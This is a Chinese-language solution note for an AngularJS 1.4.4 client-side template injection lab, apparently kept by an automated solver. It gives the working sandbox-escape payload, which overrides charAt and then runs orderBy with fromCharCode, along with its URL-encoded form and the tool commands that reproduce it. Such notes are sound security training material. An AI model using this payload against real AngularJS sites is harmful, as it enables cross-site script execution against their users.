---
title: lab-angular-sandbox-escape-without-strings
---

# lab-angular-sandbox-escape-without-strings

> evidences: [[client-side-template-injection-family]]

- 题面:AngularJS 1.4.4,`$eval` 不可用、不能用字符串;逃逸沙箱执行 `alert`。
- 实例(批49):https://0ad700ab046bab1f806a2625000f0000.web-security-academy.net
- 判定:**solved** — 横幅 `<h4>Congratulations, you solved the lab!</h4>`(`banner_verdict.solved=true`)

## 服务端生成形(实测)

每个 query 参数各生成一段(顺序 = Java HashMap):

```js
var key = '<参数名>'; $scope.query[key] = '<参数值>'; $scope.value = $parse(key)($scope.query);
```

⇒ **参数名**就是被 `$parse` 的表达式,原样插入单引号字符串(不转义,含 `'` 会破串);`search` 必须存在才生成循环;值被 HTML 转义,所以只有名字可用。

## 解法载荷(单条 $parse 内完成)

```
?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

- `fromCharCode(120,61,97,108,101,114,116,40,49,41)` = `x=alert(1)`(全程无字符串字面量);
- `orderBy` 的字符串谓词在**运行时**才被 `$parse`,以每个元素为 scope 求值 ⇒ 在 charAt override **之后**仍能编译并执行;
- 参数名里 `=` 必须发 `%3D`,否则被 query 解析器切开。URL 编码名:
  `toString().constructor.prototype.charAt%3D%5B%5D.join%3B%5B1%5D%7CorderBy%3AtoString().constructor.fromCharCode%28120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29`

## 推翻批48 结论

批48 用 `page_eval_batch` 把 override 与载荷拆成**两次** `$parse` 调用,观察到 `P('1+1')` → NaN、`P('constructor.constructor(a)()')` → 静默 no-op,据此判「先 override 再跑执行式」整条路死。**该否证作废**:把 override 与载荷写进**同一条表达式**(override 作第一条语句,`[1]|orderBy:…` 作第二条)后 `alert(1)` 真实触发(`page_alert` → `fired=true, alerts:["alert:1"]`)。拆开调用的探针测的不是 lab 的真实编译路径。

## 复现命令

```
range_launch launch d82e3a0ca07b096a36c320bdaf6f10ac92869a49f98d1adfd16b4ffdc05390f1 --jar ~/.pi-rs/agent/chrome-jar.json
page_alert 'https://<inst>/?search=1&toString().constructor.prototype.charAt%3D%5B%5D.join%3B%5B1%5D%7CorderBy%3AtoString().constructor.fromCharCode%28120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29=1'
banner_verdict 'https://<inst>/'
```

## 关系

- 族:[[client-side-template-injection-family]];沙箱表见 [[angularjs-1-4-4-sandbox-escape-practice-notes]]。
